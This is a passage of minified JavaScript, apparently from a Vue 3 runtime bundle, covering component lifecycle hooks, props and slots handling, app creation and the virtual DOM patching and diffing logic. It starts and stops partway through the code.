function ns(e, t, s = 0, n) {
    if (!Ce(e) || e.__v_skip) return e;
    if (t && t > 0) {
        if (s >= t) return e;
        s++
    }
    if (n = n || new Set, n.has(e)) return e;
    if (n.add(e), Ye(e)) ns(e.value, t, s, n);
    else if (Q(e))
        for (let i = 0; i < e.length; i++) ns(e[i], t, s, n);
    else if (Jl(e) || Cs(e)) e.forEach(i => {
        ns(i, t, s, n)
    });
    else if (sc(e))
        for (const i in e) ns(e[i], t, s, n);
    return e
}

function Ft(e, t) {
    if (Me === null) return e;
    const s = Ri(Me) || Me.proxy,
        n = e.dirs || (e.dirs = []);
    for (let i = 0; i < t.length; i++) {
        let [r, o, l, a = be] = t[i];
        r && (ee(r) && (r = {
            mounted: r,
            updated: r
        }), r.deep && ns(o), n.push({
            dir: r,
            instance: s,
            value: o,
            oldValue: void 0,
            arg: l,
            modifiers: a
        }))
    }
    return e
}

function Jt(e, t, s, n) {
    const i = e.dirs,
        r = t && t.dirs;
    for (let o = 0; o < i.length; o++) {
        const l = i[o];
        r && (l.oldValue = r[o].value);
        let a = l.dir[n];
        a && (us(), ht(a, s, 8, [e.el, l, e, t]), hs())
    }
} /*! #__NO_SIDE_EFFECTS__ */
function Oc(e, t) {
    return ee(e) ? De({
        name: e.name
    }, t, {
        setup: e
    }) : e
}
const tn = e => !!e.type.__asyncLoader,
    $c = e => e.type.__isKeepAlive;

function Kp(e, t) {
    Rc(e, "a", t)
}

function Zp(e, t) {
    Rc(e, "da", t)
}

function Rc(e, t, s = Fe) {
    const n = e.__wdc || (e.__wdc = () => {
        let i = s;
        for (; i;) {
            if (i.isDeactivated) return;
            i = i.parent
        }
        return e()
    });
    if (Mi(t, n, s), s) {
        let i = s.parent;
        for (; i && i.parent;) $c(i.parent.vnode) && Xp(n, t, s, i), i = i.parent
    }
}

function Xp(e, t, s, n) {
    const i = Mi(t, e, n, !0);
    Hc(() => {
        go(n[t], i)
    }, s)
}

function Mi(e, t, s = Fe, n = !1) {
    if (s) {
        const i = s[e] || (s[e] = []),
            r = t.__weh || (t.__weh = (...o) => {
                if (s.isUnmounted) return;
                us();
                const l = Tn(s),
                    a = ht(t, s, e, o);
                return l(), hs(), a
            });
        return n ? i.unshift(r) : i.push(r), r
    }
}
const $t = e => (t, s = Fe) => (!$i || e === "sp") && Mi(e, (...n) => t(...n), s),
    Yp = $t("bm"),
    Lo = $t("m"),
    Dc = $t("bu"),
    Io = $t("u"),
    No = $t("bum"),
    Hc = $t("um"),
    Qp = $t("sp"),
    Jp = $t("rtg"),
    eu = $t("rtc");

function tu(e, t = Fe) {
    Mi("ec", e, t)
}

function Ke(e, t, s, n) {
    let i;
    const r = s && s[n];
    if (Q(e) || Ne(e)) {
        i = new Array(e.length);
        for (let o = 0, l = e.length; o < l; o++) i[o] = t(e[o], o, void 0, r && r[o])
    } else if (typeof e == "number") {
        i = new Array(e);
        for (let o = 0; o < e; o++) i[o] = t(o + 1, o, void 0, r && r[o])
    } else if (Ce(e))
        if (e[Symbol.iterator]) i = Array.from(e, (o, l) => t(o, l, void 0, r && r[l]));
        else {
            const o = Object.keys(e);
            i = new Array(o.length);
            for (let l = 0, a = o.length; l < a; l++) {
                const c = o[l];
                i[l] = t(e[c], c, l, r && r[l])
            }
        }
    else i = [];
    return s && (s[n] = i), i
}

function su(e, t, s = {}, n, i) {
    if (Me.isCE || Me.parent && tn(Me.parent) && Me.parent.isCE) return t !== "default" && (s.name = t), q("slot", s, n && n());
    let r = e[t];
    r && r._c && (r._d = !1), O();
    const o = r && Vc(r(s)),
        l = Vs(he, {
            key: s.key || o && o.key || `_${t}`
        }, o || (n ? n() : []), o && e._ === 1 ? 64 : -2);
    return !i && l.scopeId && (l.slotScopeIds = [l.scopeId + "-s"]), r && r._c && (r._d = !0), l
}

function Vc(e) {
    return e.some(t => oi(t) ? !(t.type === Xt || t.type === he && !Vc(t.children)) : !0) ? e : null
}
const $r = e => e ? Yc(e) ? Ri(e) || e.proxy : $r(e.parent) : null,
    sn = De(Object.create(null), {
        $: e => e,
        $el: e => e.vnode.el,
        $data: e => e.data,
        $props: e => e.props,
        $attrs: e => e.attrs,
        $slots: e => e.slots,
        $refs: e => e.refs,
        $parent: e => $r(e.parent),
        $root: e => $r(e.root),
        $emit: e => e.emit,
        $options: e => Po(e),
        $forceUpdate: e => e.f || (e.f = () => {
            e.effect.dirty = !0, Ao(e.update)
        }),
        $nextTick: e => e.n || (e.n = To.bind(e.proxy)),
        $watch: e => qp.bind(e)
    }),
    ir = (e, t) => e !== be && !e.__isScriptSetup && le(e, t),
    nu = {
        get({
            _: e
        }, t) {
            const {
                ctx: s,
                setupState: n,
                data: i,
                props: r,
                accessCache: o,
                type: l,
                appContext: a
            } = e;
            let c;
            if (t[0] !== "$") {
                const g = o[t];
                if (g !== void 0) switch (g) {
                    case 1:
                        return n[t];
                    case 2:
                        return i[t];
                    case 4:
                        return s[t];
                    case 3:
                        return r[t]
                } else {
                    if (ir(n, t)) return o[t] = 1, n[t];
                    if (i !== be && le(i, t)) return o[t] = 2, i[t];
                    if ((c = e.propsOptions[0]) && le(c, t)) return o[t] = 3, r[t];
                    if (s !== be && le(s, t)) return o[t] = 4, s[t];
                    Rr && (o[t] = 0)
                }
            }
            const d = sn[t];
            let p, u;
            if (d) return t === "$attrs" && Xe(e, "get", t), d(e);
            if ((p = l.__cssModules) && (p = p[t])) return p;
            if (s !== be && le(s, t)) return o[t] = 4, s[t];
            if (u = a.config.globalProperties, le(u, t)) return u[t]
        },
        set({
            _: e
        }, t, s) {
            const {
                data: n,
                setupState: i,
                ctx: r
            } = e;
            return ir(i, t) ? (i[t] = s, !0) : n !== be && le(n, t) ? (n[t] = s, !0) : le(e.props, t) || t[0] === "$" && t.slice(1) in e ? !1 : (r[t] = s, !0)
        },
        has({
            _: {
                data: e,
                setupState: t,
                accessCache: s,
                ctx: n,
                appContext: i,
                propsOptions: r
            }
        }, o) {
            let l;
            return !!s[o] || e !== be && le(e, o) || ir(t, o) || (l = r[0]) && le(l, o) || le(n, o) || le(sn, o) || le(i.config.globalProperties, o)
        },
        defineProperty(e, t, s) {
            return s.get != null ? e._.accessCache[t] = 0 : le(s, "value") && this.set(e, t, s.value, null), Reflect.defineProperty(e, t, s)
        }
    };

function $a(e) {
    return Q(e) ? e.reduce((t, s) => (t[s] = null, t), {}) : e
}
let Rr = !0;

function iu(e) {
    const t = Po(e),
        s = e.proxy,
        n = e.ctx;
    Rr = !1, t.beforeCreate && Ra(t.beforeCreate, e, "bc");
    const {
        data: i,
        computed: r,
        methods: o,
        watch: l,
        provide: a,
        inject: c,
        created: d,
        beforeMount: p,
        mounted: u,
        beforeUpdate: g,
        updated: w,
        activated: b,
        deactivated: S,
        beforeDestroy: x,
        beforeUnmount: v,
        destroyed: y,
        unmounted: C,
        render: L,
        renderTracked: M,
        renderTriggered: se,
        errorCaptured: W,
        serverPrefetch: N,
        expose: P,
        inheritAttrs: F,
        components: X,
        directives: V,
        filters: te
    } = t;
    if (c && ru(c, n, null), o)
        for (const fe in o) {
            const ae = o[fe];
            ee(ae) && (n[fe] = ae.bind(s))
        }
    if (i) {
        const fe = i.call(s, s);
        Ce(fe) && (e.data = Li(fe))
    }
    if (Rr = !0, r)
        for (const fe in r) {
            const ae = r[fe],
                nt = ee(ae) ? ae.bind(s, s) : ee(ae.get) ? ae.get.bind(s, s) : lt,
                dt = !ee(ae) && ee(ae.set) ? ae.set.bind(s) : lt,
                it = ot({
                    get: nt,
                    set: dt
                });
            Object.defineProperty(n, fe, {
                enumerable: !0,
                configurable: !0,
                get: () => it.value,
                set: He => it.value = He
            })
        }
    if (l)
        for (const fe in l) jc(l[fe], n, s, fe);
    if (a) {
        const fe = ee(a) ? a.call(s) : a;
        Reflect.ownKeys(fe).forEach(ae => {
            Ts(ae, fe[ae])
        })
    }
    d && Ra(d, e, "c");

    function re(fe, ae) {
        Q(ae) ? ae.forEach(nt => fe(nt.bind(s))) : ae && fe(ae.bind(s))
    }
    if (re(Yp, p), re(Lo, u), re(Dc, g), re(Io, w), re(Kp, b), re(Zp, S), re(tu, W), re(eu, M), re(Jp, se), re(No, v), re(Hc, C), re(Qp, N), Q(P))
        if (P.length) {
            const fe = e.exposed || (e.exposed = {});
            P.forEach(ae => {
                Object.defineProperty(fe, ae, {
                    get: () => s[ae],
                    set: nt => s[ae] = nt
                })
            })
        } else e.exposed || (e.exposed = {});
    L && e.render === lt && (e.render = L), F != null && (e.inheritAttrs = F), X && (e.components = X), V && (e.directives = V)
}

function ru(e, t, s = lt) {
    Q(e) && (e = Dr(e));
    for (const n in e) {
        const i = e[n];
        let r;
        Ce(i) ? "default" in i ? r = kt(i.from || n, i.default, !0) : r = kt(i.from || n) : r = kt(i), Ye(r) ? Object.defineProperty(t, n, {
            enumerable: !0,
            configurable: !0,
            get: () => r.value,
            set: o => r.value = o
        }) : t[n] = r
    }
}

function Ra(e, t, s) {
    ht(Q(e) ? e.map(n => n.bind(t.proxy)) : e.bind(t.proxy), t, s)
}

function jc(e, t, s, n) {
    const i = n.includes(".") ? kc(s, n) : () => s[n];
    if (Ne(e)) {
        const r = t[e];
        ee(r) && en(i, r)
    } else if (ee(e)) en(i, e.bind(s));
    else if (Ce(e))
        if (Q(e)) e.forEach(r => jc(r, t, s, n));
        else {
            const r = ee(e.handler) ? e.handler.bind(s) : t[e.handler];
            ee(r) && en(i, r, e)
        }
}

function Po(e) {
    const t = e.type,
        {
            mixins: s,
            extends: n
        } = t,
        {
            mixins: i,
            optionsCache: r,
            config: {
                optionMergeStrategies: o
            }
        } = e.appContext,
        l = r.get(t);
    let a;
    return l ? a = l : !i.length && !s && !n ? a = t : (a = {}, i.length && i.forEach(c => ii(a, c, o, !0)), ii(a, t, o)), Ce(t) && r.set(t, a), a
}

function ii(e, t, s, n = !1) {
    const {
        mixins: i,
        extends: r
    } = t;
    r && ii(e, r, s, !0), i && i.forEach(o => ii(e, o, s, !0));
    for (const o in t)
        if (!(n && o === "expose")) {
            const l = ou[o] || s && s[o];
            e[o] = l ? l(e[o], t[o]) : t[o]
        }
    return e
}
const ou = {
    data: Da,
    props: Ha,
    emits: Ha,
    methods: Ys,
    computed: Ys,
    beforeCreate: Ge,
    created: Ge,
    beforeMount: Ge,
    mounted: Ge,
    beforeUpdate: Ge,
    updated: Ge,
    beforeDestroy: Ge,
    beforeUnmount: Ge,
    destroyed: Ge,
    unmounted: Ge,
    activated: Ge,
    deactivated: Ge,
    errorCaptured: Ge,
    serverPrefetch: Ge,
    components: Ys,
    directives: Ys,
    watch: lu,
    provide: Da,
    inject: au
};

function Da(e, t) {
    return t ? e ? function() {
        return De(ee(e) ? e.call(this, this) : e, ee(t) ? t.call(this, this) : t)
    } : t : e
}

function au(e, t) {
    return Ys(Dr(e), Dr(t))
}

function Dr(e) {
    if (Q(e)) {
        const t = {};
        for (let s = 0; s < e.length; s++) t[e[s]] = e[s];
        return t
    }
    return e
}

function Ge(e, t) {
    return e ? [...new Set([].concat(e, t))] : t
}

function Ys(e, t) {
    return e ? De(Object.create(null), e, t) : t
}

function Ha(e, t) {
    return e ? Q(e) && Q(t) ? [...new Set([...e, ...t])] : De(Object.create(null), $a(e), $a(t ?? {})) : t
}

function lu(e, t) {
    if (!e) return t;
    if (!t) return e;
    const s = De(Object.create(null), e);
    for (const n in t) s[n] = Ge(e[n], t[n]);
    return s
}

function Bc() {
    return {
        app: null,
        config: {
            isNativeTag: Wf,
            performance: !1,
            globalProperties: {},
            optionMergeStrategies: {},
            errorHandler: void 0,
            warnHandler: void 0,
            compilerOptions: {}
        },
        mixins: [],
        components: {},
        directives: {},
        provides: Object.create(null),
        optionsCache: new WeakMap,
        propsCache: new WeakMap,
        emitsCache: new WeakMap
    }
}
let cu = 0;

function du(e, t) {
    return function(n, i = null) {
        ee(n) || (n = De({}, n)), i != null && !Ce(i) && (i = null);
        const r = Bc(),
            o = new WeakSet;
        let l = !1;
        const a = r.app = {
            _uid: cu++,
            _component: n,
            _props: i,
            _container: null,
            _context: r,
            _instance: null,
            version: Ou,
            get config() {
                return r.config
            },
            set config(c) {},
            use(c, ...d) {
                return o.has(c) || (c && ee(c.install) ? (o.add(c), c.install(a, ...d)) : ee(c) && (o.add(c), c(a, ...d))), a
            },
            mixin(c) {
                return r.mixins.includes(c) || r.mixins.push(c), a
            },
            component(c, d) {
                return d ? (r.components[c] = d, a) : r.components[c]
            },
            directive(c, d) {
                return d ? (r.directives[c] = d, a) : r.directives[c]
            },
            mount(c, d, p) {
                if (!l) {
                    const u = q(n, i);
                    return u.appContext = r, p === !0 ? p = "svg" : p === !1 && (p = void 0), d && t ? t(u, c) : e(u, c, p), l = !0, a._container = c, c.__vue_app__ = a, Ri(u.component) || u.component.proxy
                }
            },
            unmount() {
                l && (e(null, a._container), delete a._container.__vue_app__)
            },
            provide(c, d) {
                return r.provides[c] = d, a
            },
            runWithContext(c) {
                ri = a;
                try {
                    return c()
                } finally {
                    ri = null
                }
            }
        };
        return a
    }
}
let ri = null;

function Ts(e, t) {
    if (Fe) {
        let s = Fe.provides;
        const n = Fe.parent && Fe.parent.provides;
        n === s && (s = Fe.provides = Object.create(n)), s[e] = t
    }
}

function kt(e, t, s = !1) {
    const n = Fe || Me;
    if (n || ri) {
        const i = n ? n.parent == null ? n.vnode.appContext && n.vnode.appContext.provides : n.parent.provides : ri._context.provides;
        if (i && e in i) return i[e];
        if (arguments.length > 1) return s && ee(t) ? t.call(n && n.proxy) : t
    }
}

function fu(e, t, s, n = !1) {
    const i = {},
        r = {};
    ti(r, Oi, 1), e.propsDefaults = Object.create(null), Fc(e, t, i, r);
    for (const o in e.propsOptions[0]) o in i || (i[o] = void 0);
    s ? e.props = n ? i : yc(i) : e.type.props ? e.props = i : e.props = r, e.attrs = r
}

function pu(e, t, s, n) {
    const {
        props: i,
        attrs: r,
        vnode: {
            patchFlag: o
        }
    } = e, l = de(i), [a] = e.propsOptions;
    let c = !1;
    if ((n || o > 0) && !(o & 16)) {
        if (o & 8) {
            const d = e.vnode.dynamicProps;
            for (let p = 0; p < d.length; p++) {
                let u = d[p];
                if (Ni(e.emitsOptions, u)) continue;
                const g = t[u];
                if (a)
                    if (le(r, u)) g !== r[u] && (r[u] = g, c = !0);
                    else {
                        const w = Tt(u);
                        i[w] = Hr(a, l, w, g, e, !1)
                    }
                else g !== r[u] && (r[u] = g, c = !0)
            }
        }
    } else {
        Fc(e, t, i, r) && (c = !0);
        let d;
        for (const p in l)(!t || !le(t, p) && ((d = Hs(p)) === p || !le(t, d))) && (a ? s && (s[p] !== void 0 || s[d] !== void 0) && (i[p] = Hr(a, l, p, void 0, e, !0)) : delete i[p]);
        if (r !== l)
            for (const p in r)(!t || !le(t, p)) && (delete r[p], c = !0)
    }
    c && Pt(e, "set", "$attrs")
}

function Fc(e, t, s, n) {
    const [i, r] = e.propsOptions;
    let o = !1,
        l;
    if (t)
        for (let a in t) {
            if (Zn(a)) continue;
            const c = t[a];
            let d;
            i && le(i, d = Tt(a)) ? !r || !r.includes(d) ? s[d] = c : (l || (l = {}))[d] = c : Ni(e.emitsOptions, a) || (!(a in n) || c !== n[a]) && (n[a] = c, o = !0)
        }
    if (r) {
        const a = de(s),
            c = l || be;
        for (let d = 0; d < r.length; d++) {
            const p = r[d];
            s[p] = Hr(i, a, p, c[p], e, !le(c, p))
        }
    }
    return o
}

function Hr(e, t, s, n, i, r) {
    const o = e[s];
    if (o != null) {
        const l = le(o, "default");
        if (l && n === void 0) {
            const a = o.default;
            if (o.type !== Function && !o.skipFactory && ee(a)) {
                const {
                    propsDefaults: c
                } = i;
                if (s in c) n = c[s];
                else {
                    const d = Tn(i);
                    n = c[s] = a.call(null, t), d()
                }
            } else n = a
        }
        o[0] && (r && !l ? n = !1 : o[1] && (n === "" || n === Hs(s)) && (n = !0))
    }
    return n
}

function zc(e, t, s = !1) {
    const n = t.propsCache,
        i = n.get(e);
    if (i) return i;
    const r = e.props,
        o = {},
        l = [];
    let a = !1;
    if (!ee(e)) {
        const d = p => {
            a = !0;
            const [u, g] = zc(p, t, !0);
            De(o, u), g && l.push(...g)
        };
        !s && t.mixins.length && t.mixins.forEach(d), e.extends && d(e.extends), e.mixins && e.mixins.forEach(d)
    }
    if (!r && !a) return Ce(e) && n.set(e, _s), _s;
    if (Q(r))
        for (let d = 0; d < r.length; d++) {
            const p = Tt(r[d]);
            Va(p) && (o[p] = be)
        } else if (r)
            for (const d in r) {
                const p = Tt(d);
                if (Va(p)) {
                    const u = r[d],
                        g = o[p] = Q(u) || ee(u) ? {
                            type: u
                        } : De({}, u);
                    if (g) {
                        const w = Fa(Boolean, g.type),
                            b = Fa(String, g.type);
                        g[0] = w > -1, g[1] = b < 0 || w < b, (w > -1 || le(g, "default")) && l.push(p)
                    }
                }
            }
    const c = [o, l];
    return Ce(e) && n.set(e, c), c
}

function Va(e) {
    return e[0] !== "$"
}

function ja(e) {
    const t = e && e.toString().match(/^\s*(function|class) (\w+)/);
    return t ? t[2] : e === null ? "null" : ""
}

function Ba(e, t) {
    return ja(e) === ja(t)
}

function Fa(e, t) {
    return Q(t) ? t.findIndex(s => Ba(s, e)) : ee(t) && Ba(t, e) ? 0 : -1
}
const Uc = e => e[0] === "_" || e === "$stable",
    Mo = e => Q(e) ? e.map(wt) : [wt(e)],
    uu = (e, t, s) => {
        if (t._n) return t;
        const n = Mt((...i) => Mo(t(...i)), s);
        return n._c = !1, n
    },
    Gc = (e, t, s) => {
        const n = e._ctx;
        for (const i in e) {
            if (Uc(i)) continue;
            const r = e[i];
            if (ee(r)) t[i] = uu(i, r, n);
            else if (r != null) {
                const o = Mo(r);
                t[i] = () => o
            }
        }
    },
    Wc = (e, t) => {
        const s = Mo(t);
        e.slots.default = () => s
    },
    hu = (e, t) => {
        if (e.vnode.shapeFlag & 32) {
            const s = t._;
            s ? (e.slots = de(t), ti(t, "_", s)) : Gc(t, e.slots = {})
        } else e.slots = {}, t && Wc(e, t);
        ti(e.slots, Oi, 1)
    },
    gu = (e, t, s) => {
        const {
            vnode: n,
            slots: i
        } = e;
        let r = !0,
            o = be;
        if (n.shapeFlag & 32) {
            const l = t._;
            l ? s && l === 1 ? r = !1 : (De(i, t), !s && l === 1 && delete i._) : (r = !t.$stable, Gc(t, i)), o = t
        } else t && (Wc(e, t), o = {
            default: 1
        });
        if (r)
            for (const l in i) !Uc(l) && o[l] == null && delete i[l]
    };

function Vr(e, t, s, n, i = !1) {
    if (Q(e)) {
        e.forEach((u, g) => Vr(u, t && (Q(t) ? t[g] : t), s, n, i));
        return
    }
    if (tn(n) && !i) return;
    const r = n.shapeFlag & 4 ? Ri(n.component) || n.component.proxy : n.el,
        o = i ? null : r,
        {
            i: l,
            r: a
        } = e,
        c = t && t.r,
        d = l.refs === be ? l.refs = {} : l.refs,
        p = l.setupState;
    if (c != null && c !== a && (Ne(c) ? (d[c] = null, le(p, c) && (p[c] = null)) : Ye(c) && (c.value = null)), ee(a)) Wt(a, l, 12, [o, d]);
    else {
        const u = Ne(a),
            g = Ye(a),
            w = e.f;
        if (u || g) {
            const b = () => {
                if (w) {
                    const S = u ? le(p, a) ? p[a] : d[a] : a.value;
                    i ? Q(S) && go(S, r) : Q(S) ? S.includes(r) || S.push(r) : u ? (d[a] = [r], le(p, a) && (p[a] = d[a])) : (a.value = [r], e.k && (d[e.k] = a.value))
                } else u ? (d[a] = o, le(p, a) && (p[a] = o)) : g && (a.value = o, e.k && (d[e.k] = o))
            };
            i || w ? b() : (b.id = -1, Ze(b, s))
        }
    }
}
const Ze = Up;

function mu(e) {
    return vu(e)
}

function vu(e, t) {
    const s = nc();
    s.__VUE__ = !0;
    const {
        insert: n,
        remove: i,
        patchProp: r,
        createElement: o,
        createText: l,
        createComment: a,
        setText: c,
        setElementText: d,
        parentNode: p,
        nextSibling: u,
        setScopeId: g = lt,
        insertStaticContent: w
    } = e, b = (h, m, _, A = null, E = null, $ = null, B = void 0, k = null, D = !!m.dynamicChildren) => {
        if (h === m) return;
        h && !Ws(h, m) && (A = T(h), He(h, E, $, !0), h = null), m.patchFlag === -2 && (D = !1, m.dynamicChildren = null);
        const {
            type: I,
            ref: U,
            shapeFlag: Z
        } = m;
        switch (I) {
            case ki:
                S(h, m, _, A);
                break;
            case Xt:
                x(h, m, _, A);
                break;
            case Qn:
                h == null && v(m, _, A, B);
                break;
            case he:
                X(h, m, _, A, E, $, B, k, D);
                break;
            default:
                Z & 1 ? L(h, m, _, A, E, $, B, k, D) : Z & 6 ? V(h, m, _, A, E, $, B, k, D) : (Z & 64 || Z & 128) && I.process(h, m, _, A, E, $, B, k, D, G)
        }
        U != null && E && Vr(U, h && h.ref, $, m || h, !m)
    }, S = (h, m, _, A) => {
        if (h == null) n(m.el = l(m.children), _, A);
        else {
            const E = m.el = h.el;
            m.children !== h.children && c(E, m.children)
        }
    }, x = (h, m, _, A) => {
        h == null ? n(m.el = a(m.children || ""), _, A) : m.el = h.el
    }, v = (h, m, _, A) => {
        [h.el, h.anchor] = w(h.children, m, _, A, h.el, h.anchor)
    }, y = ({
        el: h,
        anchor: m
    }, _, A) => {
        let E;
        for (; h && h !== m;) E = u(h), n(h, _, A), h = E;
        n(m, _, A)
    }, C = ({
        el: h,
        anchor: m
    }) => {
        let _;
        for (; h && h !== m;) _ = u(h), i(h), h = _;
        i(m)
    }, L = (h, m, _, A, E, $, B, k, D) => {
        m.type === "svg" ? B = "svg" : m.type === "math" && (B = "mathml"), h == null ? M(m, _, A, E, $, B, k, D) : N(h, m, E, $, B, k, D)
    }, M = (h, m, _, A, E, $, B, k) => {
        let D, I;
        const {
            props: U,
            shapeFlag: Z,
            transition: K,
            dirs: J
        } = h;
        if (D = h.el = o(h.type, $, U && U.is, U), Z & 8 ? d(D, h.children) : Z & 16 && W(h.children, D, null, A, E, rr(h, $), B, k), J && Jt(h, null, A, "created"), se(D, h, h.scopeId, B, A), U) {
            for (const me in U) me !== "value" && !Zn(me) && r(D, me, null, U[me], $, h.children, A, E, Ve);
            "value" in U && r(D, "value", null, U.value, $), (I = U.onVnodeBeforeMount) && bt(I, A, h)
        }
        J && Jt(h, null, A, "beforeMount");
        const ie = yu(E, K);
        ie && K.beforeEnter(D), n(D, m, _), ((I = U && U.onVnodeMounted) || ie || J) && Ze(() => {
            I && bt(I, A, h), ie && K.enter(D), J && Jt(h, null, A, "mounted")
        }, E)
    }, se = (h, m, _, A, E) => {
        if (_ && g(h, _), A)
            for (let $ = 0; $ < A.length; $++) g(h, A[$]);
        if (E) {
            let $ = E.subTree;
            if (m === $) {
                const B = E.vnode;
                se(h, B, B.scopeId, B.slotScopeIds, E.parent)
            }
        }
    }, W = (h, m, _, A, E, $, B, k, D = 0) => {
        for (let I = D; I < h.length; I++) {
            const U = h[I] = k ? Vt(h[I]) : wt(h[I]);
            b(null, U, m, _, A, E, $, B, k)
        }
    }, N = (h, m, _, A, E, $, B) => {
        const k = m.el = h.el;
        let {
            patchFlag: D,
            dynamicChildren: I,
            dirs: U
        } = m;
        D |= h.patchFlag & 16;
        const Z = h.props || be,
            K = m.props || be;
        let J;
        if (_ && es(_, !1), (J = K.onVnodeBeforeUpdate) && bt(J, _, m, h), U && Jt(m, h, _, "beforeUpdate"), _ && es(_, !0), I ? P(h.dynamicChildren, I, k, _, A, rr(m, E), $) : B || ae(h, m, k, null, _, A, rr(m, E), $, !1), D > 0) {
            if (D & 16) F(k, m, Z, K, _, A, E);
            else if (D & 2 && Z.class !== K.class && r(k, "class", null, K.class, E), D & 4 && r(k, "style", Z.style, K.style, E), D & 8) {
                const ie = m.dynamicProps;
                for (let me = 0; me < ie.length; me++) {
                    const _e = ie[me],
                        Pe = Z[_e],
                        ft = K[_e];
                    (ft !== Pe || _e === "value") && r(k, _e, Pe, ft, E, h.children, _, A, Ve)
                }
            }
            D & 1 && h.children !== m.children && d(k, m.children)
        } else !B && I == null && F(k, m, Z, K, _, A, E);
        ((J = K.onVnodeUpdated) || U) && Ze(() => {
            J && bt(J, _, m, h), U && Jt(m, h, _, "updated")
        }, A)
    }, P = (h, m, _, A, E, $, B) => {
        for (let k = 0; k < m.length; k++) {
            const D = h[k],
                I = m[k],
                U = D.el && (D.type === he || !Ws(D, I) || D.shapeFlag & 70) ? p(D.el) : _;
            b(D, I, U, null, A, E, $, B, !0)
        }
    }, F = (h, m, _, A, E, $, B) => {
        if (_ !== A) {
            if (_ !== be)
                for (const k in _) !Zn(k) && !(k in A) && r(h, k, _[k], null, B, m.children, E, $, Ve);
            for (const k in A) {
                if (Zn(k)) continue;
                const D = A[k],
                    I = _[k];
                D !== I && k !== "value" && r(h, k, I, D, B, m.children, E, $, Ve)
            }
            "value" in A && r(h, "value", _.value, A.value, B)
        }
    }, X = (h, m, _, A, E, $, B, k, D) => {
        const I = m.el = h ? h.el : l(""),
            U = m.anchor = h ? h.anchor : l("");
        let {
            patchFlag: Z,
            dynamicChildren: K,
            slotScopeIds: J
        } = m;
        J && (k = k ? k.concat(J) : J), h == null ? (n(I, _, A), n(U, _, A), W(m.children || [], _, U, E, $, B, k, D)) : Z > 0 && Z & 64 && K && h.dynamicChildren ? (P(h.dynamicChildren, K, _, E, $, B, k), (m.key != null || E && m === E.subTree) && qc(h, m, !0)) : ae(h, m, _, U, E, $, B, k, D)
    }, V = (h, m, _, A, E, $, B, k, D) => {
        m.slotScopeIds = k, h == null ? m.shapeFlag & 512 ? E.ctx.activate(m, _, A, B, D) : te(m, _, A, E, $, B, D) : ne(h, m, D)
    }, te = (h, m, _, A, E, $, B) => {
        const k = h.component = Au(h, A, E);
        if ($c(h) && (k.ctx.renderer = G), Lu(k), k.asyncDep) {
            if (E && E.registerDep(k, re), !h.el) {
                const D = k.subTree = q(Xt);
                x(null, D, m, _)
            }
        } else re(k, h, m, _, E, $, B)
    }, ne = (h, m, _) => {
        const A = m.component = h.component;
        if (Vp(h, m, _))
            if (A.asyncDep && !A.asyncResolved) {
                fe(A, m, _);
                return
            } else A.next = m, Pp(A.update), A.effect.dirty = !0, A.update();
        else m.el = h.el, A.vnode = m
    }, re = (h, m, _, A, E, $, B) => {
        const k = () => {
                if (h.isMounted) {
                    let {
                        next: U,
                        bu: Z,
                        u: K,
                        parent: J,
                        vnode: ie
                    } = h; {
                        const vs = Kc(h);
                        if (vs) {
                            U && (U.el = ie.el, fe(h, U, B)), vs.asyncDep.then(() => {
                                h.isUnmounted || k()
                            });
                            return
                        }
                    }
                    let me = U,
                        _e;
                    es(h, !1), U ? (U.el = ie.el, fe(h, U, B)) : U = ie, Z && Xn(Z), (_e = U.props && U.props.onVnodeBeforeUpdate) && bt(_e, J, U, ie), es(h, !0);
                    const Pe = nr(h),
                        ft = h.subTree;
                    h.subTree = Pe, b(ft, Pe, p(ft.el), T(ft), h, E, $), U.el = Pe.el, me === null && jp(h, Pe.el), K && Ze(K, E), (_e = U.props && U.props.onVnodeUpdated) && Ze(() => bt(_e, J, U, ie), E)
                } else {
                    let U;
                    const {
                        el: Z,
                        props: K
                    } = m, {
                        bm: J,
                        m: ie,
                        parent: me
                    } = h, _e = tn(m);
                    if (es(h, !1), J && Xn(J), !_e && (U = K && K.onVnodeBeforeMount) && bt(U, me, m), es(h, !0), Z && xe) {
                        const Pe = () => {
                            h.subTree = nr(h), xe(Z, h.subTree, h, E, null)
                        };
                        _e ? m.type.__asyncLoader().then(() => !h.isUnmounted && Pe()) : Pe()
                    } else {
                        const Pe = h.subTree = nr(h);
                        b(null, Pe, _, A, h, E, $), m.el = Pe.el
                    }
                    if (ie && Ze(ie, E), !_e && (U = K && K.onVnodeMounted)) {
                        const Pe = m;
                        Ze(() => bt(U, me, Pe), E)
                    }(m.shapeFlag & 256 || me && tn(me.vnode) && me.vnode.shapeFlag & 256) && h.a && Ze(h.a, E), h.isMounted = !0, m = _ = A = null
                }
            },
            D = h.effect = new yo(k, lt, () => Ao(I), h.scope),
            I = h.update = () => {
                D.dirty && D.run()
            };
        I.id = h.uid, es(h, !0), I()
    }, fe = (h, m, _) => {
        m.component = h;
        const A = h.vnode.props;
        h.vnode = m, h.next = null, pu(h, m.props, A, _), gu(h, m.children, _), us(), Ma(h), hs()
    }, ae = (h, m, _, A, E, $, B, k, D = !1) => {
        const I = h && h.children,
            U = h ? h.shapeFlag : 0,
            Z = m.children,
            {
                patchFlag: K,
                shapeFlag: J
            } = m;
        if (K > 0) {
            if (K & 128) {
                dt(I, Z, _, A, E, $, B, k, D);
                return
            } else if (K & 256) {
                nt(I, Z, _, A, E, $, B, k, D);
                return
            }
        }
        J & 8 ? (U & 16 && Ve(I, E, $), Z !== I && d(_, Z)) : U & 16 ? J & 16 ? dt(I, Z, _, A, E, $, B, k, D) : Ve(I, E, $, !0) : (U & 8 && d(_, ""), J & 16 && W(Z, _, A, E, $, B, k, D))
    }, nt = (h, m, _, A, E, $, B, k, D) => {
        h = h || _s, m = m || _s;
        const I = h.length,
            U = m.length,
            Z = Math.min(I, U);
        let K;
        for (K = 0; K < Z; K++) {
            const J = m[K] = D ? Vt(m[K]) : wt(m[K]);
            b(h[K], J, _, null, E, $, B, k, D)
        }
        I > U ? Ve(h, E, $, !0, !1, Z) : W(m, _, A, E, $, B, k, D, Z)
    }, dt = (h, m, _, A, E, $, B, k, D) => {
        let I = 0;
        const U = m.length;
        let Z = h.length - 1,
            K = U - 1;
        for (; I <= Z && I <= K;) {
            const J = h[I],
                ie = m[I] = D ? Vt(m[I]) : wt(m[I]);
            if (Ws(J, ie)) b(J, ie, _, null, E, $, B, k, D);
            else break;
            I++
        }
        for (; I <= Z && I <= K;) {
            const J = h[Z],
                ie = m[K] = D ? Vt(m[K]) : wt(m[K]);
